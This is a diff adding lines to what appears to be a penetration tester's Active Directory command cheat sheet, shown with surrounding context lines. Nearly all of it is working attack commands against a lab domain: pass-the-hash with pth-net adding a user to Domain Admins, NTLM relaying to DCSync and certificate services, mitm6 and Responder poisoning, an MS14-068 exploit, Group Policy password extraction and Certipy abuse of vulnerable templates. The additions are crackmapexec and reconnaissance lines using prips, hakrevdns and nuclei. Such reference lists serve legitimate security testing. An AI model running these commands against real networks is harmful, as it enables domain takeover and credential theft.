@@ -33,6 +33,8 @@ rpcclient -U BREAKING/anonymous 192.168.56.101
 pth-net rpc group members 'Domain admins' -U 'BREAKING.BAD'/'Administrator'%'ffffffffffffffffffffffffffffffff':'a88baa3fdc8f581ee0fb05d7054d43e4' -S 'DC01.BREAKING.BAD'
 pth-net rpc group addmem 'Domain admins' 'Shutdown' -U 'BREAKING.BAD'/'Administrator'%'ffffffffffffffffffffffffffffffff':'a88baa3fdc8f581ee0fb05d7054d43e4' -S 'DC01.BREAKING.BAD'
 cme smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
+cme ldap DC01.BREAKING.BAD -d BREAKING.BAD -u someuser -p somepassword -M MAQ
+cme smb IP/CIDR --gen-relay-list smb_targets.txt
 mitm6 --interface eth0
 mitm6 --interface eth0 --domain BREAKING.BAD
 responder --interface eth0 --wpad --lm --ProxyAuth
@@ -285,6 +287,7 @@ ms14-068.py -u someuser@breaking.bad --rc4 0123456789krbtgtnthash0123456789 -s S
 getST.py -k -no-pass -spn host/dc01.breaking.bad breaking.bad/someuser
 ldapdomaindump --user 'breaking.bad\someuser' --password 'somepassword' --outdir ldapdomaindump dc01.breaking.bad
 Get-GPPPassword -debug -no-pass dc01.breaking.bad
+Get-GPPPassword BREAKING.BAD/someuser:somepassword@DC01.BREAKING.BAD
 cme smb --list-modules
 cme ldap dc01.breaking.bad -d breaking.bad -u someuser -p somepassword -M maq
 ntlmrelayx -t dcsync://dc02.breaking.bad -smb2support
@@ -309,4 +312,9 @@ webclientservicescanner -dc-ip dc01.domain.local domain.local/user:password@dc01
 ntlmrelayx -t http://pki.domain.local/certsrv/certfnsh.asp --adcs
 certipy 'domain.local'/'user':'password'@'domaincontroller' -dc-ip 'domaincontroller' auto -scheme ldap -user 'administrator'
 certipy 'domain.local'/'user':'password'@'domaincontroller' -dc-ip 'domaincontroller' find -scheme ldap -vulnerable
+echo '8.8.8.8' | hakrevdns
+prips 192.168.0.0 192.168.0.255
+prips -i4 192.168.0.10 192.168.0.250
+prips 173.0.84.0/24 | hakrevdns
+nuclei -u https://example.com
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
